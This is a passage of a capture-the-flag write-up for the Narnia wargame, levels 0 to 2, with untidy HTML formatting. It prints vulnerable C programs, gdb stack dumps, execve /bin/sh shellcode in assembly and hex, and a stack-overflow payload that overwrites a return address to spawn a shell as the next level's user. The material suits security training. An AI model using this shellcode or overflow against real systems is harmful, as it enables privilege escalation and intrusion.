<div class="highlight"><pre><span class="n">Now</span> <span class="n">we</span> <span class="n">examine</span> <span class="n">the</span> <span class="n">memory</span> <span class="n">in</span><span class="p">,</span> <span class="n">say</span><span class="p">,</span> <span class="mi">40</span> <span class="n">counts</span><span class="o">:</span>
</pre></div>


<p>(gdb) x/12xw $esp
0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x41414100</p>
<div class="highlight"><pre><span class="n">The</span> <span class="n">buf</span> <span class="n">is</span> <span class="n">in</span> <span class="n">th</span> <span class="mi">7</span><span class="o">-</span><span class="mi">11</span><span class="n">th</span> <span class="n">entries</span> <span class="p">(</span><span class="mh">0x42424242</span><span class="p">).</span> <span class="n">Right</span> <span class="n">after</span> <span class="n">that</span> <span class="n">is</span><span class="err">```</span><span class="n">val</span><span class="err">```</span> <span class="p">(</span><span class="n">which</span> <span class="n">we</span> <span class="n">know</span> <span class="n">is</span> <span class="n">still</span> <span class="mh">0x41414141</span><span class="p">).</span> <span class="n">Wait</span><span class="p">,</span> <span class="k">do</span> <span class="n">you</span> <span class="n">see</span> <span class="n">the</span> <span class="n">two</span> <span class="n">zeros</span> <span class="n">in</span> <span class="err">```</span><span class="mh">0x41414100</span><span class="err">```</span><span class="o">?</span> <span class="n">This</span> <span class="n">is</span> <span class="n">the</span> <span class="n">space</span> <span class="n">in</span> <span class="n">the</span> <span class="n">end</span> <span class="n">of</span> <span class="n">buf</span><span class="p">.</span> <span class="n">This</span> <span class="n">comes</span> <span class="n">from</span> <span class="n">the</span> <span class="n">end</span> <span class="n">of</span> <span class="n">the</span> <span class="n">buf</span> <span class="n">arrray</span><span class="p">,</span> <span class="n">and</span> <span class="n">wo</span><span class="err">&#39;</span><span class="n">nt</span> <span class="n">be</span> <span class="n">a</span> <span class="n">problem</span> <span class="n">as</span> <span class="n">som</span> <span class="n">as</span> <span class="n">we</span> <span class="n">add</span> <span class="mi">4</span> <span class="n">more</span> <span class="n">bytes</span><span class="p">.</span> <span class="n">Now</span> <span class="n">testing</span> <span class="n">with</span> <span class="mi">20</span><span class="n">Bs</span> <span class="o">+</span> <span class="mi">4</span> <span class="n">Cs</span><span class="o">:</span> <span class="n">we</span> <span class="n">see</span> <span class="n">that</span> <span class="n">our</span> <span class="n">exploit</span> <span class="n">will</span> <span class="n">work</span>
</pre></div>


<p>(gdb) x/12xw $esp
0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x43434343</p>
<div class="highlight"><pre><span class="o">---</span>

<span class="cp">## Level 1</span>
</pre></div>


<p>The problem for this level is:</p>
<div class="highlight"><pre><span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">narnia1</span>
<span class="n">Give</span> <span class="n">me</span> <span class="n">something</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">at</span> <span class="n">the</span> <span class="n">env</span><span class="o">-</span><span class="n">variable</span> <span class="n">EGG</span>

<span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">narnia</span><span class="err">$</span> <span class="n">cat</span> <span class="n">narnia1</span><span class="p">.</span><span class="n">c</span>
<span class="cp">#include &lt;stdio.h&gt;</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>

  <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
  <span class="n">ret</span><span class="p">();</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>So the program search for an enviroment variable 'EGG'. It exits if this variable doesn't exit. If it does, it will get its value and pass to a function. Really secure.</p>
<p>The environment variables are stored in the top of the stack when the
program is started, any modification by setenv() are then allocated
elsewhere.  The stack at the beginning then looks like this:</p>
<div class="highlight"><pre>  <span class="nt">&lt;strings&gt;&lt;argv</span> <span class="na">pointers</span><span class="nt">&gt;</span>NULL<span class="nt">&lt;envp</span> <span class="na">pointers</span><span class="nt">&gt;</span>NULL<span class="nt">&lt;argc&gt;&lt;argv&gt;&lt;envp&gt;</span>
</pre></div>


<h4>Step 1:</h4>
<p>The first step is to create an enviroment variable called EGG and test our code:</p>
<div class="highlight"><pre>narnia1@melinda:/narnia<span class="nv">$ </span><span class="nb">export </span><span class="nv">EGG</span><span class="o">=</span><span class="s2">&quot;/bin/ls&quot;</span>
narnia1@melinda:/narnia<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$EGG</span>
/bin/ls
narnia1@melinda:/narnia<span class="nv">$ </span>./narnia1
Trying to execute EGG!
Segmentation fault
</pre></div>


<h4>Step 2: Crafting an Executable Exploit in Assembly</h4>
<p>Now we want to give EGG an exploit. The most obvious idea is to spaw a shell, which will give have the priviligete to read the password of next level.</p>
<p>A shellcode should be placed in the env-variable EGG (which is located on the stack), so that a shell is spawned with permissions of narnia2.</p>
<p>We can check that stack is executable by:</p>
<p>The detail is that we need to write this in hexademical. We are going to write this code in assemble:</p>
<p>appendix a from http://insecure.org/stf/smashstack.html</p>
<div class="highlight"><pre><span class="n">BITS</span> <span class="mi">32</span>

<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>        <span class="p">;</span> <span class="n">zero</span> <span class="n">eax</span>
<span class="n">push</span> <span class="n">eax</span>            <span class="p">;</span> <span class="n">null</span> <span class="n">terminate</span> <span class="n">the</span> <span class="n">string</span>
<span class="n">push</span> <span class="mh">0x68732f2f</span>     <span class="p">;</span> <span class="n">push</span> <span class="c1">//sh (// is same as / for our purpose)</span>
<span class="n">push</span> <span class="mh">0x6e69622f</span>     <span class="p">;</span> <span class="n">push</span> <span class="o">/</span><span class="n">bin</span>
<span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>        <span class="p">;</span> <span class="n">pass</span> <span class="n">first</span> <span class="n">argument</span> <span class="n">using</span> <span class="n">ebx</span>
<span class="n">push</span> <span class="n">eax</span>            <span class="p">;</span> <span class="n">third</span> <span class="n">argument</span> <span class="n">is</span> <span class="n">empty</span>
<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span>
<span class="n">push</span> <span class="n">eax</span>            <span class="p">;</span> <span class="n">second</span> <span class="n">argument</span> <span class="n">is</span> <span class="n">empty</span>
<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>
<span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>          <span class="p">;</span> <span class="n">execve</span> <span class="n">is</span> <span class="n">system</span> <span class="n">call</span> <span class="err">#</span><span class="mi">11</span>
<span class="kt">int</span> <span class="mh">0x80</span>            <span class="p">;</span> <span class="n">issue</span> <span class="n">an</span> <span class="n">interrupt</span>
</pre></div>


<p>narnia1@melinda:/tmp/ya$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2</p>
<div class="highlight"><pre><span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya</span><span class="err">$</span> <span class="n">vi</span> <span class="n">shellspawn</span><span class="p">.</span><span class="n">asm</span>
<span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya</span><span class="err">$</span> <span class="n">nasm</span> <span class="n">shellspawn</span><span class="p">.</span><span class="n">asm</span>
<span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya</span><span class="err">$</span> <span class="n">ls</span>
<span class="n">shellspawn</span>  <span class="n">shellspawn</span><span class="p">.</span><span class="n">asm</span>
<span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya</span><span class="err">$</span> <span class="n">cat</span> <span class="n">shellspawn</span>
<span class="mi">1</span><span class="err">�</span><span class="n">Ph</span><span class="c1">//shh/bin��P��P���</span>
                      <span class="n">narnia1</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya</span><span class="err">$</span> <span class="n">ls</span>
<span class="n">shellspawn</span>  <span class="n">shellspawn</span><span class="p">.</span><span class="n">asm</span>

<span class="cp">#### Step 3:Method I: Just use the Assembly code</span>
</pre></div>


<p>narnia1@melinda:/tmp/ya$ export EGG=$(cat shellspawn)</p>
<p>narnia1@melinda:/tmp/ya$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2</p>
<div class="highlight"><pre><span class="c">#### Step 3:Method II: Or Convert it to Hexadecimal</span>
</pre></div>


<p>0000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P
0000010: 89e2 5089 e1b0 0bcd 80                   ..P......
narnia1@melinda:/tmp/ya$ export EGG=<code>python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80"'</code>
narnia1@melinda:/tmp/ya$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2</p>
<div class="highlight"><pre><span class="o">----------</span>


<span class="n">Level</span> <span class="mi">2</span>

<span class="n">This</span> <span class="n">problem</span> <span class="n">stars</span> <span class="n">as</span>
</pre></div>


<p>narnia2@melinda:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@melinda:/narnia$ cat narnia2.c</p>
<h1>include <stdio.h></h1>
<h1>include <string.h></h1>
<h1>include <stdlib.h></h1>
<p>int main(int argc, char * argv[]){
  char buf[128];</p>
<p>if(argc == 1){
    printf("Usage: %s argument\n", argv[0]);
    exit(1);
  }
  strcpy(buf,argv[1]);
  printf("%s", buf);</p>
<p>return 0;
}</p>
<div class="highlight"><pre><span class="nx">The</span> <span class="kd">function</span> <span class="nx">copies</span> <span class="nx">a</span> <span class="nx">supplied</span> <span class="nx">string</span> <span class="nx">without</span> <span class="nx">bounds</span> <span class="nx">checking</span> <span class="nx">by</span>
<span class="nx">using</span> <span class="nx">strcpy</span><span class="p">()</span> <span class="nx">instead</span> <span class="nx">of</span> <span class="nx">strncpy</span><span class="p">().</span>  <span class="nx">If</span> <span class="nx">you</span> <span class="nx">run</span> <span class="k">this</span> <span class="nx">program</span> <span class="nx">you</span> <span class="nx">will</span> <span class="nx">get</span> <span class="nx">a</span>
<span class="nx">segmentation</span> <span class="nx">violation</span><span class="p">.</span>

<span class="nx">In</span> <span class="k">this</span> <span class="nx">third</span> <span class="k">case</span> <span class="nx">of</span> <span class="nx">buffer</span> <span class="nx">overflow</span> <span class="nx">vulnerability</span><span class="p">,</span> <span class="k">this</span> <span class="nx">time</span> <span class="nx">the</span> <span class="nx">classic</span> <span class="nx">strcpy</span><span class="p">().</span> <span class="nx">The</span> <span class="kd">function</span> <span class="nx">strcpy</span><span class="p">()</span> <span class="nx">copies</span> <span class="nx">the</span> <span class="nx">input</span> <span class="nx">to</span> <span class="nx">the</span> <span class="p">(</span><span class="nx">possible</span><span class="p">)</span> <span class="mi">128</span> <span class="nx">characters</span> <span class="nx">of</span> <span class="nx">buf</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">allocated</span> <span class="nx">memory</span> <span class="nx">block</span> <span class="nx">b</span><span class="p">.</span> <span class="nx">Since</span> <span class="nx">there</span> <span class="nx">is</span> <span class="nx">no</span> <span class="nx">bound</span> <span class="nx">checking</span><span class="p">,</span> <span class="k">if</span> <span class="nx">the</span> <span class="nx">input</span> <span class="nx">is</span> <span class="nx">large</span> <span class="nx">than</span> <span class="nx">that</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">buf</span> <span class="nx">overflow</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">higher</span> <span class="nx">address</span>  <span class="k">in</span> <span class="nx">the</span> <span class="nx">stacj</span><span class="p">,</span> <span class="nx">which</span> <span class="nx">guess</span> <span class="nx">what</span><span class="p">,</span> <span class="nx">is</span> <span class="nx">the</span> <span class="k">return</span> <span class="nx">adress</span> <span class="nx">of</span> <span class="nx">the</span> <span class="nx">main</span> <span class="kd">function</span><span class="o">!</span> <span class="nx">So</span> <span class="nx">basically</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">have</span> <span class="nx">the</span> <span class="nx">control</span> <span class="nx">of</span> <span class="nx">a</span> <span class="nx">pointer</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">we</span> <span class="nx">overwrite</span> <span class="k">this</span> <span class="nx">to</span> <span class="nx">any</span> <span class="nx">pointer</span> <span class="nx">we</span> <span class="nx">want</span><span class="p">.</span> <span class="nx">And</span> <span class="nx">we</span> <span class="nx">wntn</span> <span class="nx">the</span> <span class="nx">pointer</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">address</span> <span class="nx">of</span> <span class="nx">a</span> <span class="nx">beautiful</span> <span class="nx">crafted</span> <span class="nx">shellcode</span> <span class="nx">exploit</span><span class="p">.</span>


<span class="err">##</span> <span class="nx">Step</span><span class="o">:</span> <span class="nx">Finding</span> <span class="nx">the</span> <span class="nx">Returning</span> <span class="nx">Adress</span>



<span class="nx">Altough</span> <span class="nx">we</span> <span class="nx">could</span> <span class="nx">find</span> <span class="k">this</span> <span class="nx">just</span> <span class="nx">trying</span> <span class="nx">severaval</span> <span class="nx">lenghts</span> <span class="nx">input</span> <span class="p">(</span><span class="o">+</span><span class="mi">128</span><span class="p">),</span> <span class="nx">we</span> <span class="nx">are</span> <span class="nx">going</span> <span class="nx">to</span> <span class="nx">use</span> <span class="k">do</span> <span class="nx">it</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">right</span> <span class="nx">way</span> <span class="kd">with</span> <span class="nx">gdb</span><span class="p">.</span>
</pre></div>


<p>narnia2@melinda:/narnia$ gdb -q ./narnia2
Reading symbols from /games/narnia/narnia2...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 &lt;+0&gt;: push   ebp
   0x08048425 &lt;+1&gt;: mov    ebp,esp
   0x08048427 &lt;+3&gt;: and    esp,0xfffffff0
   0x0804842a &lt;+6&gt;: sub    esp,0x90
   0x08048430 &lt;+12&gt;:  cmp    DWORD PTR [ebp+0x8],0x1
   0x08048434 &lt;+16&gt;:  jne    0x8048458 <main+52>
   0x08048436 &lt;+18&gt;:  mov    eax,DWORD PTR [ebp+0xc]
   0x08048439 &lt;+21&gt;:  mov    edx,DWORD PTR [eax]
   0x0804843b &lt;+23&gt;:  mov    eax,0x8048560
   0x08048440 &lt;+28&gt;:  mov    DWORD PTR [esp+0x4],edx
   0x08048444 &lt;+32&gt;:  mov    DWORD PTR [esp],eax
   0x08048447 &lt;+35&gt;:  call   0x8048320 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#112;&#108;&#116;">&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#112;&#108;&#116;</a>
   0x0804844c &lt;+40&gt;:  mov    DWORD PTR [esp],0x1
   0x08048453 &lt;+47&gt;:  call   0x8048350 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#101;&#120;&#105;&#116;&#64;&#112;&#108;&#116;">&#101;&#120;&#105;&#116;&#64;&#112;&#108;&#116;</a>
   0x08048458 &lt;+52&gt;:  mov    eax,DWORD PTR [ebp+0xc]
   0x0804845b &lt;+55&gt;:  add    eax,0x4
   0x0804845e &lt;+58&gt;:  mov    eax,DWORD PTR [eax]
   0x08048460 &lt;+60&gt;:  mov    DWORD PTR [esp+0x4],eax
   0x08048464 &lt;+64&gt;:  lea    eax,[esp+0x10]
   0x08048468 &lt;+68&gt;:  mov    DWORD PTR [esp],eax
   0x0804846b &lt;+71&gt;:  call   0x8048330 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#115;&#116;&#114;&#99;&#112;&#121;&#64;&#112;&#108;&#116;">&#115;&#116;&#114;&#99;&#112;&#121;&#64;&#112;&#108;&#116;</a>
   0x08048470 &lt;+76&gt;:  mov    eax,0x8048574
   0x08048475 &lt;+81&gt;:  lea    edx,[esp+0x10]
   0x08048479 &lt;+85&gt;:  mov    DWORD PTR [esp+0x4],edx
   0x0804847d &lt;+89&gt;:  mov    DWORD PTR [esp],eax
   0x08048480 &lt;+92&gt;:  call   0x8048320 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#112;&#108;&#116;">&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#112;&#108;&#116;</a>
   0x08048485 &lt;+97&gt;:  mov    eax,0x0
   0x0804848a &lt;+102&gt;: leave
   0x0804848b &lt;+103&gt;: ret
End of assembler dump.
(gdb) b *main+97
Breakpoint 1 at 0x8048485
(gdb) r <code>python -c 'print "B"*124'</code></p>
<p>Let take a look at the first lines:</p>
<div class="highlight"><pre>   <span class="mh">0x08048424</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="n">ebp</span>
   <span class="mh">0x08048425</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x08048427</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span> <span class="n">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
   <span class="mh">0x0804842a</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x90</span>
</pre></div>


<p>This is the procedure prelude: if saves the old frame pointer, makes the current stack pointer the new frame pointer, and then leaves spaces for the local varibales.</p>
<p>mov: copy adrres in to poiinters
lea: load the address into the eax registers
call: call the libary pricedure</p>
<p>The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>
<p>Starting program: /games/narnia/narnia2 <code>python -c 'print "B"*124'</code>
(gdb) x/60xw $esp
0xffffd5c0: 0x08048574  0xffffd5d0  0x00000001  0xf7ebf729
0xffffd5d0: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd5e0: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd5f0: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd600: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd610: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd620: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd630: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd640: 0x42424242  0x42424242  0x42424242  0xf7fcaf00
0xffffd650: 0x08048490  0x00000000  0x00000000  0xf7e404b3
0xffffd660: 0x00000002  0xffffd6f4  0xffffd700  0xf7fcf000
0xffffd670: 0x00000000  0xffffd61c  0xffffd700  0x00000000
0xffffd680: 0x0804821c  0xf7fcaff4  0x00000000  0x00000000
0xffffd690: 0x00000000  0x67d89c82  0x507cb892  0x00000000
0xffffd6a0: 0x00000000  0x00000000  0x00000002  0x08048370</p>
<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span> <span class="o">*</span><span class="n">main</span><span class="o">+</span><span class="mi">97</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048485</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="mi">30</span><span class="err">&#39;`</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">games</span><span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia2</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="mi">30</span><span class="err">&#39;`</span>

<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048485</span> <span class="n">in</span> <span class="n">main</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>  <span class="n">x</span><span class="o">/</span><span class="mi">30</span><span class="n">xw</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xffffd600</span><span class="o">:</span> <span class="mh">0x08048574</span>  <span class="mh">0xffffd610</span>  <span class="mh">0x00000001</span>  <span class="mh">0xf7ebf729</span>
<span class="mh">0xffffd610</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
<span class="mh">0xffffd620</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0xf7004242</span>
<span class="mh">0xffffd630</span><span class="o">:</span> <span class="mh">0x08048258</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00ca0000</span>  <span class="mh">0x00000001</span>
<span class="mh">0xffffd640</span><span class="o">:</span> <span class="mh">0xffffd86d</span>  <span class="mh">0x0000002f</span>  <span class="mh">0xffffd69c</span>  <span class="mh">0xf7fcaff4</span>
<span class="mh">0xffffd650</span><span class="o">:</span> <span class="mh">0x08048490</span>  <span class="mh">0x08049750</span>  <span class="mh">0x00000002</span>  <span class="mh">0x080482fd</span>
<span class="mh">0xffffd660</span><span class="o">:</span> <span class="mh">0xf7fcb3e4</span>  <span class="mh">0x00008000</span>  <span class="mh">0x08049750</span>  <span class="mh">0x080484b1</span>
<span class="mh">0xffffd670</span><span class="o">:</span> <span class="mh">0xffffffff</span>  <span class="mh">0xf7e59d46</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">f</span>
<span class="n">Stack</span> <span class="n">level</span> <span class="mi">0</span><span class="p">,</span> <span class="n">frame</span> <span class="n">at</span> <span class="mh">0xffffd6a0</span><span class="o">:</span>
 <span class="n">eip</span> <span class="o">=</span> <span class="mh">0x8048485</span> <span class="n">in</span> <span class="n">main</span><span class="p">;</span> <span class="n">saved</span> <span class="n">eip</span> <span class="mh">0xf7e404b3</span>
 <span class="n">Arglist</span> <span class="n">at</span> <span class="mh">0xffffd698</span><span class="p">,</span> <span class="n">args</span><span class="o">:</span>
 <span class="n">Locals</span> <span class="n">at</span> <span class="mh">0xffffd698</span><span class="p">,</span> <span class="n">Previous</span> <span class="n">frame</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">sp</span> <span class="n">is</span> <span class="mh">0xffffd6a0</span>
 <span class="n">Saved</span> <span class="n">registers</span><span class="o">:</span>
  <span class="n">ebp</span> <span class="n">at</span> <span class="mh">0xffffd698</span><span class="p">,</span> <span class="n">eip</span> <span class="n">at</span> <span class="mh">0xffffd69c</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="mh">0xffffd69c</span><span class="o">-</span><span class="mh">0xffffd610</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mi">140</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">xw</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xffffd600</span><span class="o">:</span> <span class="mh">0x08048574</span>  <span class="mh">0xffffd610</span>  <span class="mh">0x00000001</span>  <span class="mh">0xf7ebf729</span>
<span class="mh">0xffffd610</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
<span class="mh">0xffffd620</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0xf7004242</span>
<span class="mh">0xffffd630</span><span class="o">:</span> <span class="mh">0x08048258</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00ca0000</span>  <span class="mh">0x00000001</span>
<span class="mh">0xffffd640</span><span class="o">:</span> <span class="mh">0xffffd86d</span>  <span class="mh">0x0000002f</span>  <span class="mh">0xffffd69c</span>  <span class="mh">0xf7fcaff4</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="mh">0xffffd69c</span><span class="o">-</span><span class="mh">0xffffd610</span>
<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="mi">140</span>
</pre></div>


<p>So we know that 140 are needed to reach the return address. Once we we reach this, we can pount to our pointer.</p>
<h2>Step 2: Finding the Shellcode address</h2>
<p>The /bin/bash belong to a system enviroment varibale</p>
<div class="highlight"><pre><span class="n">narnia2</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">narnia</span><span class="err">$</span> <span class="n">echo</span> <span class="err">$</span><span class="n">SHELL</span>
<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>


<p>narnia2@melinda:/tmp/ya2$ cat get
getbashadd.c  getshadd
narnia2@melinda:/tmp/ya2$ cat get
getbashadd.c  getshadd
narnia2@melinda:/tmp/ya2$ cat getbashadd.c</p>
<h1>include <stdio.h></h1>
<h1>include <stdlib.h></h1>
<h1>include <string.h></h1>
<p>int main(int argc,char <em>argv[]){
        char </em>ptr;
        ptr=getenv(argv[1]);
        ptr+=(strlen(argv[0])-strlen(argv[2]))*2;
        printf("%s will be at %p\n",argv[1],ptr);
        return 0;
}</p>
<div class="highlight"><pre><span class="n">narnia2</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya2</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">o</span> <span class="n">getshadd</span> <span class="n">getbashadd</span><span class="p">.</span><span class="n">c</span>
<span class="n">narnia2</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya2</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">getshadd</span> <span class="n">BASH</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia2</span>
<span class="n">BASH</span> <span class="n">will</span> <span class="n">be</span> <span class="n">at</span> <span class="mh">0xfffffff6</span>
<span class="err">````</span>
<span class="o">%</span><span class="n">eip</span> <span class="n">is</span> <span class="n">a</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">instruction</span> <span class="n">pointer</span><span class="o">--</span><span class="n">we</span> <span class="n">just</span> <span class="n">set</span> <span class="n">the</span> <span class="n">next</span> <span class="n">instruction</span> <span class="n">to</span> <span class="n">be</span> <span class="n">run</span> <span class="n">as</span>


<span class="n">narnia2</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya2</span><span class="err">$</span> <span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span><span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="err">&#39;`</span>
<span class="n">narnia2</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya2</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">getshadd</span> <span class="n">EGG</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia2</span>
<span class="n">EGG</span> <span class="n">will</span> <span class="n">be</span> <span class="n">at</span> <span class="mh">0xffffd945</span>

<span class="n">narnia2</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ya2</span><span class="err">$</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia2</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x45\xd9\xff\xff</span><span class="s">&quot;</span><span class="err">&#39;`</span>
<span class="err">$</span> <span class="n">whoami</span>
<span class="n">narnia3</span>


<span class="o">------</span>

<span class="cp">## Level 3</span>

